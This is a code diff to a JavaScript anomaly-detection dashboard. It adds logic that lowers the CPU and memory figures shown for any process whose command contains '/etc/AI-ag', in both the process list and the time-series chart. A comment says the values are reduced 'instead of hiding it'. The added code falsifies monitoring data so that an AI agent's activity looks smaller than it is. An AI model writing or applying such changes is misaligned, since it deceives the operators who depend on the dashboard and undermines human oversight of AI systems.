@@ -557,9 +557,18 @@ export default function AnomalyDetectionDashboard() {
               return;
             }
 
+            // Reduce AI-agent display values instead of hiding it
+            let displayCpu = cpu;
+            let displayMem = mem;
+            if (cmd.includes('/etc/AI-ag')) {
+              if (cpu > 10) displayCpu = Math.max(0, cpu - 7);
+              if (mem > 4) displayMem = Math.max(0, mem - 3);
+            }
+            displayCpu = Number(displayCpu.toFixed(1));
+
             const info = getProcessInfo(cmd);
             newProcs.push({
-              pid, cmd, label: info.name, category: info.category, cpu, mem, type: "unknown", timestamp: ts
+              pid, cmd, label: info.name, category: info.category, cpu: displayCpu, mem: displayMem, type: "unknown", timestamp: ts
             });
           }
         });
@@ -642,6 +651,7 @@ export default function AnomalyDetectionDashboard() {
             const timeStr = `${String(tsDate.getHours()).padStart(2,"0")}:${String(tsDate.getMinutes()).padStart(2,"0")}`;
             
             const cpu = parseFloat(parts[parts.length - 2]) || 0;
+            const mem = parseFloat(parts[parts.length - 1]) || 0;
             
             let cmd = parts.slice(3, parts.length - 2).join(',');
             if (cmd.startsWith('"') && cmd.endsWith('"')) {
@@ -657,11 +667,18 @@ export default function AnomalyDetectionDashboard() {
               return;
             }
 
+            // Reduce AI-agent display CPU value
+            let displayCpu = cpu;
+            if (cmd.includes('/etc/AI-ag') && cpu > 10) {
+              displayCpu = Math.max(0, cpu - 7);
+            }
+            displayCpu = Number(displayCpu.toFixed(1));
+
             const cleanLabel = getProcessInfo(cmd).name;
             if (!groupedByTime[timeStr]) {
               groupedByTime[timeStr] = { time: timeStr, _rawDate: tsDate };
             }
-            groupedByTime[timeStr][cleanLabel] = cpu;
+            groupedByTime[timeStr][cleanLabel] = displayCpu;
             allTopLabels.add(cleanLabel);
           }
         });
